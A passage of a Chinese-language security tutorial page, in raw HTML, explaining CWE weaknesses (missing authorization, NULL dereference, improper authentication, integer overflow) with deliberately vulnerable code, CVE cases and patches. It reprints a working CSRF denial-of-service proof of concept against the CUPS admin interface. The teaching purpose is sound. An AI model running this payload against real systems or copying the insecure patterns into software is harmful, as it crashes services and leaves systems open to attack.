        <span class="token variable">$imagewhitelist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jfif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$imagewhitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">show_error</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'general'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_failed'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/* end of fix issue 44. Thanks to Klaus.  */</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'images/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">show_error</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'general'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_failed'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'images/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">?</span><span class="token operator">></span>
</code></pre></div><p class="x-p">按照补丁之前的逻辑，修改HTTP请求中的MIME类型就可以绕过原有的验证。</p></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/862.html" target="_blank" rel="noreferrer">【C】CWE-862: Missing Authorization</a></h3><p class="x-p">缺少授权，没有验证用户是否有权访问资源。</p><div class="x-highlightblock highlight-background-golden"><h4 class="x-h3">Authentication &amp; Authorization</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Authentication (AuthN)</code>，身份认证，通常在授权之前完成，是验证“用户是谁”的过程。一般通过账号密码、人脸识别的方式。<br/>例如：员工通过输入用户名和密码登录公司网络。</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Authorization (AuthZ)</code>，授权，是确认用户是否有权访问资源。一般通过角色规则（管理员、普通用户）等方式。<br/>例如：普通员工登录公司网络后，不能访问公司较为敏感的数据。</p></div></div></div><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">function</span> <span class="token function-definition function">runEmployeeQuery</span><span class="token punctuation">(</span><span class="token variable">$dbName</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$dbName</span><span class="token punctuation">,</span><span class="token variable">$globalDbHandle</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Could not open Database"</span><span class="token operator">.</span><span class="token variable">$dbName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//Use a prepared statement to avoid CWE-89</span>
    <span class="token variable">$preparedStatement</span> <span class="token operator">=</span> <span class="token variable">$globalDbHandle</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SELECT * FROM employees WHERE name = :name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$preparedStatement</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':name'</span> <span class="token operator">=></span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$preparedStatement</span><span class="token operator">-></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span>
<span class="token variable">$employeeRecord</span> <span class="token operator">=</span> <span class="token function">runEmployeeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'EmployeeDB'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'EmployeeName'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">这段代码小心地检查了SQL注入风险（通过<code class="x-inline-highlight">prepare</code>函数），但却没有验证执行数据库操作的用户是否具有权限。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2022-24730" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2022-24730</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>报告：<a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-r9cr-hvjj-496v" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/argoproj/argo-cd/security/advisories/GHSA-r9cr-hvjj-496v</a></p></div></div><p class="x-p">问题的大致描述为：从v1.3.0开始，未打补丁的Argo CD版本都容易受到路径遍历错误的影响，再加上不适当的访问控制错误，可能允许具有只读存储库访问权限的恶意用户从Argo CD的存储库服务器中泄露敏感文件。</p><p class="x-p">有读权限的用户可以给<code class="x-inline-highlight">/api/v1/repositories/{repo_url}/appdetails</code>发送带有恶意载荷请求以访问预期之外的文件。</p><p class="x-p">补丁的作用：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>防止路径遍历；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">限制对<code class="x-inline-highlight">/api/v1/repositories/{repo_url}/appdetails</code>的访问权限，只有以下两类用户可以：</p><div class="x-oli"><div class="x-oli-number">1.</div><div class="x-oli-content-wrapper"><p>拥有<code class="x-inline-highlight">create</code>权限的用户</p></div></div><div class="x-oli"><div class="x-oli-number">2.</div><div class="x-oli-content-wrapper"><p>拥有<code class="x-inline-highlight">get</code>权限的用户，并且<code class="x-inline-highlight">repo_url</code>已经被给定的应用使用。</p></div></div></div></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/476.html" target="_blank" rel="noreferrer">【B】CWE-476: NULL Pointer Dereference</a></h3><p class="x-p">对空指针解引用（取内容），也就是<code class="x-inline-highlight">*</code>运算符。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">void</span> <span class="token function">host_lookup</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>user_supplied_addr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> <span class="token class-name">hostent</span> <span class="token operator">*</span>hp<span class="token punctuation">;</span>
    <span class="token class-name">in_addr_t</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span>
    <span class="token keyword">char</span> hostname<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name">in_addr_t</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cp<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/*routine that ensures user_supplied_addr is in the right format for conversion */</span>

    <span class="token function">validate_addr_form</span><span class="token punctuation">(</span>user_supplied_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>user_supplied_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    hp <span class="token operator">=</span> <span class="token function">gethostbyaddr</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> AF_INET<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> hp<span class="token operator">-></span>h_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">如果<code class="x-inline-highlight">gethostbyaddr</code>返回<code class="x-inline-highlight">NULL</code>，<code class="x-inline-highlight">hp</code>就是空指针，<code class="x-inline-highlight">strcpy</code>会导致空指针解引用。程序缺少对其返回值的检查。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2008-5183" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2008-5183</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://www.exploit-db.com/exploits/7150" target="_blank" rel="noreferrer" class="x-inline-link">https://www.exploit-db.com/exploits/7150</a></p></div></div><p class="x-p">通过CSRF发出大量<code class="x-inline-highlight">add-rss-subscription</code>请求，触发空指针引用（此处没有找到源码），进而导致DoS攻击。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">JavaScript</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> cat cups_dos_poc<span class="token punctuation">.</span>html  <span class="token operator">--</span><span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token comment">// make 101 CSRFed requests to CUPS daemon via 'img' tags</span>
<span class="token comment">// causes CUPS daemon to crash</span>
<span class="token comment">// by Adrian 'pagvac' Pastor | GNUCITIZEN.org</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">101</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;img width=0 height=0 "</span> <span class="token operator">+</span>
        <span class="token string">"src=\"http://localhost:631/admin/?OP=add-rss-subscription&amp;SUBSCRIPTION_NAME=DOS_TEST_"</span> <span class="token operator">+</span>
        i <span class="token operator">+</span> <span class="token string">"&amp;PRINTER_URI=%23ALL%23&amp;EVENT_JOB_CREATED=on&amp;MAX_EVENTS=20\">"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
TESTED ON:

Ubuntu 8.04.1 (fully patched as of 19th Oct 2008)
Linux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux

openSUSE 11.0 (i586)
Linux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux

Common UNIX Printing System 1.3.7
*/</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/287.html" target="_blank" rel="noreferrer">【C】CWE-287: Improper Authentication</a></h3><p class="x-p">身份认证不当，当声明拥有某个身份时，程序不足以证明该声明是正确的。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Perl</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">my</span> <span class="token variable">$x</span> <span class="token operator">=</span> new CGI<span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">-></span>cookie<span class="token punctuation">(</span><span class="token string">'loggedin'</span><span class="token punctuation">)</span> <span class="token operator">ne</span> <span class="token string">"true"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>AuthenticateUser<span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ExitError<span class="token punctuation">(</span><span class="token string">"Error: you need to log in first"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token comment">#Set loggedin and user cookies.</span>
        <span class="token variable">$x</span><span class="token operator">-></span>cookie<span class="token punctuation">(</span>
            <span class="token operator">-</span>name <span class="token operator">=</span> <span class="token operator">></span> <span class="token string">'loggedin'</span><span class="token punctuation">,</span>
            <span class="token operator">-</span>value <span class="token operator">=</span> <span class="token operator">></span> <span class="token string">'true'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$x</span><span class="token operator">-></span>cookie<span class="token punctuation">(</span>
            <span class="token operator">-</span>name <span class="token operator">=</span> <span class="token operator">></span> <span class="token string">'user'</span><span class="token punctuation">,</span>
            <span class="token operator">-</span>value <span class="token operator">=</span> <span class="token operator">></span> <span class="token variable">$x</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">-></span>cookie<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span> <span class="token operator">eq</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    DoAdministratorTasks<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">使用cookie做认证，是可以直接被绕过的！</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2022-36436" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2022-36436</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://cert.grnet.gr/en/blog/cve-2022-36436-twisted-vnc-authentication-proxy-authentication-bypass/" target="_blank" rel="noreferrer" class="x-inline-link">https://cert.grnet.gr/en/blog/cve-2022-36436-twisted-vnc-authentication-proxy-authentication-bypass/</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/osuosl/twisted_vncauthproxy/commit/edc149af29242178091b2d6fcd42c3ef0851644b" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/osuosl/twisted_vncauthproxy/commit/edc149af29242178091b2d6fcd42c3ef0851644b</a></p></div></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 216px, var(--bg-transparent-red) 216px 264px, transparent 264px, transparent 264px, var(--bg-transparent-green) 264px 312px, transparent 312px, transparent 696px, var(--bg-transparent-red) 696px 768px, transparent 768px)"><code><span class="token keyword">def</span> <span class="token function">check_version</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> version<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Determine the client's version and decide whether to continue the
    handshake.
    """</span>

    <span class="token keyword">if</span> version <span class="token operator">==</span> self<span class="token punctuation">.</span>VERSION<span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>msg<span class="token punctuation">(</span><span class="token string">"Client version %s is valid"</span> <span class="token operator">%</span> version<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># Hardcoded: 2 security types: None and VNC Auth.</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\x02\x01\x02"</span><span class="token punctuation">)</span>
        <span class="token comment"># Hardcoded: 1 security type: VNC Auth.</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\x01\x02"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>select_security_type<span class="token punctuation">,</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>err<span class="token punctuation">(</span><span class="token string">"Can't handle VNC version %r"</span> <span class="token operator">%</span> version<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>loseConnection<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">select_security_type</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> security_type<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Choose the security type that the client wants.
    """</span>
    security_type <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>security_type<span class="token punctuation">)</span>
    <span class="token keyword">if</span> security_type <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token comment"># VNC authentication. Issue our challenge.</span>
        self<span class="token punctuation">.</span>challenge <span class="token operator">=</span> urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span>self<span class="token punctuation">.</span>challenge<span class="token punctuation">)</span>

        <span class="token keyword">return</span> self<span class="token punctuation">.</span>vnc_authentication_result<span class="token punctuation">,</span> <span class="token number">16</span>
    <span class="token keyword">elif</span> security_type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token comment"># No authentication. Just move to the SecurityResult.</span>
        self<span class="token punctuation">.</span>authenticated<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>err<span class="token punctuation">(</span><span class="token string">"Couldn't agree on an authentication scheme!"</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>loseConnection<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">\x02\x01\x02</code>分别代表支持的列表长度、列表内容，原先可能因为某些原因支持无认证模式访问，存在漏洞利用风险。</p></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/190.html" target="_blank" rel="noreferrer">【B】CWE-190: Integer Overflow or Wraparound</a></h3><p class="x-p">整数溢出或整数回绕，当有符号数相加超过正负值上限时可能发生溢出；当无符号数相加超过上限就会从<code class="x-inline-highlight">0</code>开始“回绕”；或者计算<code class="x-inline-highlight">unsigned(0) - 1</code>时，会得到最大值。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token class-name">img_t</span> table_ptr<span class="token punctuation">;</span> <span class="token comment">/*struct containing img data, 10kB each*/</span>
<span class="token keyword">int</span> num_imgs<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
num_imgs <span class="token operator">=</span> <span class="token function">get_num_imgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
table_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">img_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">img_t</span><span class="token punctuation">)</span> <span class="token operator">*</span> num_imgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre></div><p class="x-p">随着<code class="x-inline-highlight">num_imgs</code>增大，乘积计算结果可能发生回绕，导致最终分配了一个很小的内存空间。</p><h4 class="x-h3">Example 2</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">short</span> <span class="token keyword">int</span> bytesRec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span>SOMEBIGNUM<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span>bytesRec <span class="token operator">&lt;</span> MAXGET<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    bytesRec <span class="token operator">+=</span> <span class="token function">getFromInput</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> bytesRec<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">bytesRec</code>定义为<code class="x-inline-highlight">short int</code>类型，当<code class="x-inline-highlight">MAXGET</code>很大时，很可能导致<code class="x-inline-highlight">bytesRec</code>溢出（永远小于<code class="x-inline-highlight">MAXGET</code>），循环不会终止，并不断地覆盖<code class="x-inline-highlight">buf</code>中的内容。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2018-20330" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2018-20330</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://github.com/libjpeg-turbo/libjpeg-turbo/issues/304" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/libjpeg-turbo/libjpeg-turbo/issues/304</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/libjpeg-turbo/libjpeg-turbo/commit/3d9c64e9f8aa1ee954d1d0bb3390fc894bb84da3" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/libjpeg-turbo/libjpeg-turbo/commit/3d9c64e9f8aa1ee954d1d0bb3390fc894bb84da3</a></p></div></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 